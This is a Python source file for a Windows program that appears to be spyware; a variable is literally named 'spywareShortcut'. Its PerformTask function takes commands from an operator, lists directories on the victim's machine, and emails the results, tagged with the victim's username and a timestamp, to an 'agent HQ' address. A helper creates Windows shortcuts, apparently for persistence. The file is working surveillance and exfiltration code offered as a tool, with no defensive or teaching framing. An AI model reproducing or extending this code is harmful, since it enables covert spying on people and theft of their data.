#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

import time
import getpass
from win32com.client import Dispatch
from FolderContent import *
from SendEmail import *

FileMode = {
    "WRITE"  : "w",
    "READ"   : "r",
    "APPEND" : "a"
}


"""
FUNCTION NAME:  SaveContent
PARAMETER:      (string) fileName, (string) text, (string) fileMode = "a"

PURPOSE:        Save (overwrite or append) text to file
"""
def SaveContent(fileName, text, fileMode = FileMode["APPEND"]):
    outputFile = open(fileName, fileMode)
    outputFile.write(text)
    outputFile.close()


"""
FUNCTION NAME:  GetFileContent
PARAMETER:      (string) fileName, (string) mode = "r"
RETURN:         (string) fileContent

PURPOSE:        To read from file
"""
def GetFileContent(fileName, mode = FileMode["READ"]):
    currentFile = open(fileName, mode)
    fileContent = str(currentFile.read())
    currentFile.close()

    return fileContent


"""
FUNCTION NAME:  CreateShortcut
PARAMETER:      (string) targetPath, (string) shortcutLocation
RETURN:         None

PURPOSE:        To create Windows shortcut
"""
def CreateShortcut(targetPath, shortcutLocation):
    shell = Dispatch('WScript.Shell')
    spywareShortcut = shell.CreateShortCut(shortcutLocation)
    spywareShortcut.Targetpath = (targetPath)
    spywareShortcut.save()


"""
FUNCTION NAME:  HasExtension
PARAMETER:      (string) fileName, (string) fileExtension
RETURN:         boolean

PURPOSE:        To check extension from a file name
"""
def HasExtension(fileName, fileExtension):
    if (fileName.lower()).endswith(fileExtension):
        return True

    return False


"""
FUNCTION NAME:  PerformTask
PARAMETER:      (string) command
RETURN:         None

PURPOSE:        To execute command given by author
"""
def PerformTask(command):
    # If user gave command like '$ show_directory_list D:\Videos'
    if "$ show_directory_list " in command:
        directoryList = (FolderContent()).GetDirectoryContent((command.split("$ show_directory_list "))[1])

        email = SendEmail()
        email.SendFrom = AGENT_EMAIL_ADDRESS
        email.Password = AGENT_EMAIL_PASSWORD
        email.SendTo = AGENT_HQ_EMAIL_ADDRESSES
        email.Subject = "output of " + command + " from " + getpass.getuser() + " at " + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
        email.Text = directoryList
        email.Server = AGENT_EMAIL_SENDING_SERVER
        email.start()